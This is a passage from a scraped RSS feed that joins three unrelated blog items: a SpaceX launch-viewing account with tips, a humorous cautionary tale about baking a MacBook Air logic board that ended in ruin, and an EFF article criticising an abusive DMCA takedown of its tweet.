&lt;ol start=&quot;7&quot;&gt;&lt;li&gt;At 6 minutes and 11 seconds after launch the re-entry burns were going to start so we all trained our eyes to the sky, taking our best guess as to where the two boosters would appear. Somebody yelled &quot;there!&quot; and we all looked to see where that person was pointing. Two bright yellow dots were plainly visible to the right of the cloud. The reentry burns are short but they allowed us to spot the returning boosters. I was able to follow them all the way to the ground. They were mere specks at first but became more discernable as they dropped.&lt;/li&gt;
&lt;li&gt;Holy moly, these things are cooking. I remember being awed by the speed of the two objects I was looking at. Seeing them plummet from such an altitude really brings home why rocket landings are such an extraordinary feat.&lt;/li&gt;
&lt;li&gt;The landing zones are much further away from Banana Creek than the launch pad so the landing burns appear as points of light. This is too bad, but you can either be close to the launch or close to the landing. I lucked out: my spot in the bleachers allowed me to follow the boosters as they squeezed just between the &lt;a href=&quot;https://en.wikipedia.org/wiki/Vehicle_Assembly_Building&quot;&gt;VAB&lt;/a&gt; and the tan building. Fifty two seconds after the landing, a quadruple thud of sonic booms hit the crowd at Banana Creek, who were all too happy to erupt in cheers yet again.&lt;/li&gt;
&lt;/ol&gt;
&lt;p&gt;Here are a few tips for viewing a SpaceX launch and landing at Banana Creek:&lt;/p&gt;
&lt;ul&gt;&lt;li&gt;Download the press kit PDF for your launch and have it ready on your phone. It spells out the exact times of all the events of the launch. Use that and the countdown clock (which counts up after the launch) to prepare to spot events as they happen. You don’t want to be looking away when boosters separate! Here is the &lt;a href=&quot;https://www.spacex.com/sites/spacex/files/arabsat-6a_press_kit.pdf&quot;&gt;Arabsat Press Kit&lt;/a&gt;.&lt;/li&gt;
&lt;li&gt;To see as much of the landing(s) as possible, sit at the top of the bleachers South of the Saturn V Center. To avoid having your view obstructed by the tan building, don’t sit in the Northern most bleacher. I was at the South side of the second bleacher and saw as much as you can see from Banana Creek. Trees and other things will obscure the view as you sit further South.&lt;/li&gt;
&lt;li&gt;Ignore the livestream that they are showing on screens. It’s a distraction. It’s as much as 30 seconds behind and buffers a lot.&lt;/li&gt;
&lt;/ul&gt;
&lt;p&gt;The sound, sights, the ambiance are each thrilling and together they are more than the sum of their parts. Viewing a launch live is unlike anything I’ve experienced. And like any good experience, there is no substitute. No blog post can convey the complete experience. You have to go for yourself.&lt;/p&gt;

<title>Baked MacBook Air: A cautionary recipe</title>
<link>https://www.woolie.co.uk/article/baked-macbook-air/</link>
<guid isPermaLink="true" >https://www.woolie.co.uk/article/baked-macbook-air/</guid>
<description>&lt;p&gt;Putting a £1,000 Macbook Air in the oven might not be the first port of call after your trusty laptop fails to power on; I however, was feeling lucky that day. TL;DR: Cranking the temperature up higher than the recipe suggests is a bad idea, unless your goal &lt;em&gt;is&lt;/em&gt; to simultaneously desolder most components from the motherboard. Here’s a timeline of events:&lt;/p&gt;
&lt;h2 id=&quot;day-1-the-macbooks-sudden-coma&quot;&gt;Day 1: The MacBook’s sudden coma&lt;/h2&gt;
&lt;p&gt;This is the MacBook Air, bought in 2014 and specced up with maximum RAM and the fastest CPU (see FAQ at end for details). I’d expected to eek many years out of it; little did I know it would soon be entering a sauna of silicon destruction.&lt;/p&gt;
&lt;div class=&quot;gallery&quot; readability=&quot;8&quot;&gt;&lt;a href=&quot;https://www.woolie.co.uk/article/baked-macbook-air/macbook-air-before.jpg&quot;&gt;&lt;img src=&quot;https://www.woolie.co.uk/article/baked-macbook-air/macbook-air-before-thumbnail-w900.jpg&quot; alt=&quot;MacBook Air running fine before it broke&quot;/&gt;&lt;/a&gt;MacBook Air before (only picture I had, sorry)&lt;/div&gt;
&lt;p&gt;It was time to pack up the MacBook after a loyal day of service. When returning the laptop to its soft case, I misjudged the approach and my trusty machine dropped 30cm or so to the floor, landing on its corner. I thought nothing of this originally; it wasn’t first time the MacBook had been dropped and it usually coped perfectly fine. However, when opening the lid to check I hadn’t broken the screen, the tiny CPU fan screamed up to full speed, accompanied by a flash of the keyboard and screen backlight. Then all went black, the MacBook was limp and unresponsive.&lt;/p&gt;
&lt;h2 id=&quot;day-2-administering-first-aid&quot;&gt;Day 2: Administering first aid&lt;/h2&gt;
&lt;p&gt;Not a problem I thought, dropping it on the corner like that might have shaken a few bytes of SDRAM around, but nothing a power reset wouldn’t fix. However, whilst holding the power button down for increasingly desperate lengths of time, my optimism dropped until the point of acceptance that it just &lt;em&gt;wasn’t&lt;/em&gt; going to switch on.&lt;/p&gt;
&lt;p&gt;Following tech support guidance from the internet, all the following were given a shot:&lt;/p&gt;
&lt;ul&gt;&lt;li&gt;Performing multiple NVRAM/PRAM and SMC resets.&lt;/li&gt;
&lt;li&gt;Leaving the battery disconnected overnight.&lt;/li&gt;
&lt;li&gt;Disconnecting all components/connectors from the logic board, then reassembling.&lt;/li&gt;
&lt;li&gt;Bridging the logic board “power on pads”, optimistically hoping for a broken power button.&lt;/li&gt;
&lt;li&gt;Trying multiple power supplies.&lt;/li&gt;
&lt;li&gt;Applying a little &lt;a href=&quot;https://en.wiktionary.org/wiki/percussive_maintenance&quot;&gt;percussive maintenance&lt;/a&gt;.&lt;/li&gt;
&lt;/ul&gt;&lt;p&gt;Nothing worked, the MacBook remained lifeless. It wouldn’t even take a charge, the light on the charger refused to illuminate at all.&lt;/p&gt;
&lt;h2 id=&quot;day-2-bake-day&quot;&gt;Day 2: Bake day&lt;/h2&gt;
&lt;p&gt;The internet has &lt;a href=&quot;http://ales.io/2014/03/09/how-to-bake-a-mac.html&quot;&gt;happy tales&lt;/a&gt; of other owners reviving their dead MacBooks by gently baking them in the oven. I figured, if it’s good enough for those four people on the internet - it’s good enough for me. The idea is to heat the logic board just enough to &lt;a href=&quot;https://en.wikipedia.org/wiki/Reflow_soldering&quot;&gt;reflow solder&lt;/a&gt; any broken connections.&lt;/p&gt;
&lt;p&gt;Only the logic board should go in the oven, so the first stage is to remove all components and connections from the board. Despite the MacBook Air’s tiny form factor, this was surprisingly simple, although it does require use of a pentalobe and Torx driver bit. The I/O board was also removed from the chassis, as my suspicion was that the offending component would likely by located on that board - plus it would give the logic board a companion during the bake-off.&lt;/p&gt;
&lt;p&gt;Recipes suggest baking at 170 °C for 7 minutes. The instructions are not specific about whether this is for fan ovens, whether preheating is required or whether an egg-wash should be applied beforehand. In my mind, thermal shock is also a greater concern when baking a motherboard compared to a Victoria sponge, so I opted to bake from cold. Weighing up the consequences of covering our main oven in molten MacBook, I also chose to use our standalone oven (purchased solely for extra Christmas dinner capacity) instead of our kitchen oven. There’s also the matter of fire safety, which I mitigated by placing the standalone oven within booting distance of the outside door.&lt;/p&gt;
&lt;p&gt;Arranging the logic and I/O boards on the middle oven rack, I cranked up the dial to 170 °C and nervously waited for the oven to reach temperature. Unsurprisingly, gently baked MacBook doesn’t smell particularly delicious, but thankfully I’d prepared for this in advance by placing the oven in an isolated room with a door to the outside kept wide open. Six minutes into the bake, everything was still looking cushty. A few small wires had started going a bit gooey, but I was positive that the boards would survive.&lt;/p&gt;
&lt;div class=&quot;gallery&quot; readability=&quot;9&quot;&gt;&lt;a href=&quot;https://www.woolie.co.uk/article/baked-macbook-air/logic-and-io-board-inside-oven.jpg&quot;&gt;&lt;img src=&quot;https://www.woolie.co.uk/article/baked-macbook-air/logic-and-io-board-inside-oven-thumbnail-w400.jpg&quot; alt=&quot;MacBook Air logic and IO board inside portable oven&quot;/&gt;&lt;/a&gt;Logic and I/O board in oven &lt;a href=&quot;https://www.woolie.co.uk/article/baked-macbook-air/logic-and-io-board-inside-oven-close.jpg&quot;&gt;&lt;img src=&quot;https://www.woolie.co.uk/article/baked-macbook-air/logic-and-io-board-inside-oven-close-thumbnail-w400.jpg&quot; alt=&quot;MacBook Air logic and IO board inside portable oven closeup&quot;/&gt;&lt;/a&gt;Logic and I/O board in oven&lt;/div&gt;
&lt;p&gt;With confidence high and the bake nearly finished, for the final 60 seconds I thought I’d go off-piste and crank up the temperature to 180 °C - I wanted to make sure things were cooked through. Curiously peering through the oven window, all hell broke loose within 30 seconds: The room filled with sounds of popcorn being made as resistors and components desoldered themselves from the logic board and dropped onto the oven floor. The previously clear air was replaced with an acrid haze. Then the bake reached it’s finale as the logic board bowed up in the middle, accompanied by the screeching sound of the CPU being wrenched off its socket. I lunged for the power switch and yanked open the oven door, hoping to limit damage. Then, as quickly as the bowing started, everything calmed down and the board returned to its original shape. With the board still hot, a wooden spoon was employed to desperately poke the CPU back onto its mount - with little success.&lt;/p&gt;
&lt;div class=&quot;gallery&quot;&gt;&lt;a href=&quot;https://www.woolie.co.uk/article/baked-macbook-air/cpu-after.jpg&quot;&gt;&lt;img src=&quot;https://www.woolie.co.uk/article/baked-macbook-air/cpu-after-thumbnail-w400.jpg&quot; alt=&quot;MacBook Air CPU after baking - risen out of socket with pins visible&quot;/&gt;&lt;/a&gt;CPU risen after baking &lt;a href=&quot;https://www.woolie.co.uk/article/baked-macbook-air/io-board-after.jpg&quot;&gt;&lt;img src=&quot;https://www.woolie.co.uk/article/baked-macbook-air/io-board-after-thumbnail-w400.jpg&quot; alt=&quot;MacBook Air IO board after baking - USB and MagSafe drooping&quot;/&gt;&lt;/a&gt;I/O board after baking&lt;/div&gt;
&lt;p&gt;With the acrid air clearing and the oven gently ticking as it cooled, I began re-assessing the decision to place a £1,000 MacBook in the oven. Hoping to salvage some functionality, I heated a soldering iron and spent 30 minutes with a tweezer, unsuccessfully trying to solder the miniature components back onto the logic board. After the third ‘ouch’, I called time; there was no hope left.&lt;/p&gt;
&lt;div class=&quot;gallery&quot;&gt;&lt;a href=&quot;https://www.woolie.co.uk/article/baked-macbook-air/logic-board-after.jpg&quot;&gt;&lt;img src=&quot;https://www.woolie.co.uk/article/baked-macbook-air/logic-board-after-thumbnail-w400.jpg&quot; alt=&quot;MacBook Air logic board after, with resistors dropped off and components wonky.&quot;/&gt;&lt;/a&gt;Logic board after baking&lt;/div&gt;
&lt;hr/&gt;
&lt;h3 id=&quot;why-not-go-to-the-genius-bar&quot;&gt;Why not go to the genius bar?&lt;/h3&gt;
&lt;p&gt;Even before I stuck the MacBook in the oven, it was already out of warranty. I know other owners that have paid many hundreds to have Apple replace the logic board. In my case I couldn’t even be sure that the logic board was the only broken component so didn’t want to start that cash sink.&lt;/p&gt;
&lt;p&gt;Although I am tempted to take it to the genius bar now, just for entertainment.&lt;/p&gt;
&lt;h3 id=&quot;what-macbook-air-model-was-this&quot;&gt;What MacBook Air model was this?&lt;/h3&gt;
&lt;p&gt;Purchased in September 2014 with:&lt;/p&gt;
&lt;ul&gt;&lt;li&gt;1.7 GHz Dual-Core Intel Core i7, Turbo Boost up to 3.3 GHz.&lt;/li&gt;
&lt;li&gt;8 GiB 1600 MHz LPDDR3 SDRAM.&lt;/li&gt;
&lt;li&gt;128 GB PCIe-based Flash Storage.&lt;/li&gt;
&lt;/ul&gt;&lt;h3 id=&quot;why-not-use-a-thermometer&quot;&gt;Why not use a thermometer?&lt;/h3&gt;
&lt;p&gt;Pure laziness. I own numerous digital oven thermometers and infrared thermometers that would have been up to the job. The entire bake was performed in a rushed 60 minutes after work one weekday. In hindsight, if I’d have spent half as much time as I spent preparing this article on proper temperature control, I probably wouldn’t be sitting here with a bunch of useless spare parts.&lt;/p&gt;
&lt;h3 id=&quot;have-you-replaced-it-with-another-macbook&quot;&gt;Have you replaced it with another MacBook?&lt;/h3&gt;
&lt;p&gt;Not yet - I purchased a cheap tower PC instead. It had been over 10 years since I moved to laptops only and I wanted to see what had changed since. Turns out a lot has changed and this new machine has quickly become one of my favourites! Specs:&lt;/p&gt;
&lt;ul&gt;&lt;li&gt;AMD Ryzen 3 2200G CPU (/APU) with Radeon Vega 8 Graphics - considering the cost is exceptionally low, the performance of this unit really impresses.&lt;/li&gt;
&lt;li&gt;8 GiB DDR4 RAM - already nudging up on this limit regularly, so will likely upgrade to 16 GiB.&lt;/li&gt;
&lt;li&gt;120 GB SSD - used for boot and root filesystem, encrypted with LUKS.&lt;/li&gt;
&lt;li&gt;1 TB spinning rust HDD - used for bulk files, encrypted with LUKS.&lt;/li&gt;
&lt;li&gt;Standard Ubuntu (not very exciting I know). In the beginning, kernel support for this line of APU was poor, there was a seemingly 50/50 chance that it would boot successfully and it would often lockup randomly. However, since 4.18.0 everything seem to work well!&lt;/li&gt;
&lt;/ul&gt;&lt;p&gt;While on the road (well, train) I now sport a bright purple HP Stream 11-r001na, which my colleagues have branded the “Fisher-Price” laptop. Trying to get Ubuntu 18.10/GNOME 3.30 working within it’s 2 GiB RAM (whilst leaving room for anything else) was too much of a challenge, so I’ve switched to Lubuntu and LXDE/LXQT, which has made this mini-machine just about usable. The specs, for entertainment:&lt;/p&gt;
&lt;ul&gt;&lt;li&gt;Intel Celeron N3050 1.6 GHz&lt;/li&gt;
&lt;li&gt;2 GiB DDR3L SDRAM&lt;/li&gt;
&lt;li&gt;32 GB eMMC&lt;/li&gt;
&lt;/ul&gt;&lt;h3 id=&quot;what-on-earth-is-that-oven&quot;&gt;What on earth is that oven?&lt;/h3&gt;
&lt;p&gt;It’s a Klarstein MasterChef 60 Mini Oven (not that 60 L is very mini), which as mentioned above is owned solely for extra Christmas dinner capacity. It does have a small convection fan, but the heat sources are from four unshielded elements: two at the top and two at the bottom. Not the most ideal oven for even heat distribution, but certainly a safer choice than using a built in kitchen oven as it allowed the acrid fumes to be kept outside. It was also a safer choice for myself, as a I fear there would have been some disapproval if I’d have managed to fuse a circuit board to the inside of our kitchen oven.&lt;/p&gt;

<title>EFF’s Tweet About a DMCA Takedown Is Now Subject to an Overzealous Takedown</title>
<link>https://www.eff.org/deeplinks/2019/04/effs-tweet-about-overzealous-dmca-takedown-now-subject-overzealous-takedown</link>
<guid isPermaLink="true" >https://www.eff.org/deeplinks/2019/04/effs-tweet-about-overzealous-dmca-takedown-now-subject-overzealous-takedown</guid>
<description>&lt;p&gt;Update, 4/15/2019: EFF's &lt;a href=&quot;https://twitter.com/eff/status/1116784423167336448&quot;&gt;tweet has been restored&lt;/a&gt;.&lt;/p&gt;
&lt;p&gt;Get ready for a tale as good as anything you’d see on television. Here’s the sequence of events: the website TorrentFreak publishes an article about a leak of TV episodes, including shows from the network Starz. TorrentFreak tweets its article, Starz sends a copyright takedown notice. TorrentFreak writes about the takedown, including a comment from EFF. EFF tweets the article about the takedown and the original article. EFF’s tweet…gets hit with a takedown.&lt;/p&gt;
&lt;p&gt;TorrentFreak’s original &lt;a href=&quot;https://torrentfreak.com/promo-screeners-of-american-gods-and-other-tv-shows-leak-online-190408/&quot;&gt;article&lt;/a&gt; about leaked episodes of television does contain a few screenshots of some of the leaked episodes—enough to establish the veracity of the story. It does &lt;em&gt;not&lt;/em&gt; contain links to download the episodes, a fact to keep in mind as this story goes on.&lt;/p&gt;
&lt;p&gt;TorrentFreak then tweeted a link to its article, which did contain a thumbnail image, but not one that matches any of the screenshots in the article. An agency acting on behalf of Starz then used the Digital Millennium Copyright Act (DMCA) to have Twitter remove the tweet, alleging copyright infringement. The complaint TorrentFreak received says the article has “images of unreleased episodes” of the show &lt;em&gt;American Gods&lt;/em&gt;. It also maintains that TorrentFreak supplies “information about their illegal availability.”&lt;/p&gt;
&lt;p&gt;Here’s the thing: TorrentFreak reporting about an illegal event is not illegal. Reporting about copyright infringement is not infringement. The few thumbnails—including a &lt;em&gt;single&lt;/em&gt; image from &lt;em&gt;American Gods&lt;/em&gt;—act as proof of the story being reported and certainly don’t replace watching entire episodes of television. (If you don’t believe me, go look at a single screenshot from a show and figure out if it scratches the same itch as watching a whole hour of TV.) The screenshot also illustrated the watermarks in the leaked episode, which suggest that the leak came from a pre-release screener copy sent to TV critics, as the TorrentFreak article discusses.&lt;/p&gt;
&lt;p&gt;Articles reporting on true events are textbook examples of fair use. Using the DMCA in this way is an attack on journalism and fair use. Which is what we would have said if asked.&lt;/p&gt;
&lt;p&gt;Oh, wait. We were asked. TorrentFreak followed up its first &lt;a href=&quot;https://torrentfreak.com/starz-doesnt-like-news-about-leaked-tv-shows-takes-down-torrentfreak-tweet-190411/&quot;&gt;article with one about the takedown&lt;/a&gt; it received. They reached out for comment, and, among other things, EFF Senior Staff Attorney Kit Walsh told TorrentFreak:&lt;/p&gt;
&lt;blockquote readability=&quot;9&quot;&gt;
&lt;p&gt;Starz has no right to silence TorrentFreak’s news article or block links to it. The article reports that there are people on the Internet infringing copyright, but that is a far cry from being an infringement itself. The screenshots are important parts of the reporting that validate the facts being reported. Starz should withdraw its takedown and refrain from harassing journalists in the future.&lt;/p&gt;
&lt;/blockquote&gt;
&lt;p&gt;As is our wont, we &lt;a href=&quot;https://twitter.com/eff/status/1116784423167336448&quot;&gt;tweeted&lt;/a&gt; out a link to TorrentFreak’s original article, with text nearly identical to Walsh’s statement to TorrentFreak. A few days later, we also received a takedown and our tweet was blocked. At this point, you may have noticed just how far removed we are from anything that remotely resembles copyright infringement.&lt;/p&gt;
&lt;p&gt;&lt;img src=&quot;https://www.eff.org/files/2019/04/14/torrentfreaktweet_0.png&quot; alt=&quot;&quot; width=&quot;1254&quot; height=&quot;638&quot;/&gt;&lt;/p&gt;
&lt;p&gt;The DMCA notice we received from Twitter was sent by Starz.  In the field labeled “links to original work,” Starz wrote “n/a.” To reiterate: in the field about where the original work being infringed on can be located, the answer is “not applicable.” Under “Description of infringement,” it says, “Link to bootleg.” There’s no bootleg link in any of the articles or tweets.&lt;/p&gt;
&lt;p&gt;Sending a DMCA complaint requires a sworn statement that the person sending the complaint actually believes it to be copyright infringement. Look at this sequence of events again and try to imagine sending a takedown for our tweet honestly believing it to be infringement.&lt;/p&gt;
&lt;p&gt;The DMCA process allows us to send a counterclaim, explaining that the tweet is not infringement and directing Twitter to restore the tweet, barring a copyright infringement lawsuit being filed by Starz. We have done so.&lt;/p&gt;
&lt;p&gt;DMCA claims can be intimidating, especially to people who don’t know the ins and outs of the process. Fortunately, EFF is an organization that &lt;em&gt;definitely&lt;/em&gt; &lt;a href=&quot;https://www.eff.org/issues/dmca&quot;&gt;knows its rights&lt;/a&gt; and &lt;a href=&quot;https://www.eff.org/issues/intellectual-property&quot;&gt;how to exercise them.&lt;/a&gt; And we’ll keep &lt;a href=&quot;https://www.eff.org/takedowns&quot;&gt;calling out abusive takedowns&lt;/a&gt; and helping people defend their rights to speak on the Internet.&lt;/p&gt;
